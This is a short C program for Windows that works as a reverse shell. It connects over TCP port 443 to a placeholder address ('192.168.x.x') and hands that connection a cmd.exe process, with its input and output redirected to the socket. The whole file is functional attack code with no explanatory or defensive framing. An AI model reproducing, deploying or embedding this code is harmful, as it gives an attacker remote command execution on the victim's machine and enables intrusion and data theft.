#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

int main(void) {
    WSADATA wsaData;
    int iResult;

    SOCKET sockt;
    struct sockaddr_in revsockaddr;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        exit(1);
    }

    sockt = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(443);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.x.x");

    iResult = WSAConnect(sockt, (SOCKADDR*)&revsockaddr, sizeof(revsockaddr), NULL, NULL, NULL, NULL);
    if (iResult == SOCKET_ERROR) {
        closesocket(sockt);
        WSACleanup();
        exit(1);
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sockt;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(sockt);
    WSACleanup();

    return 0;
}
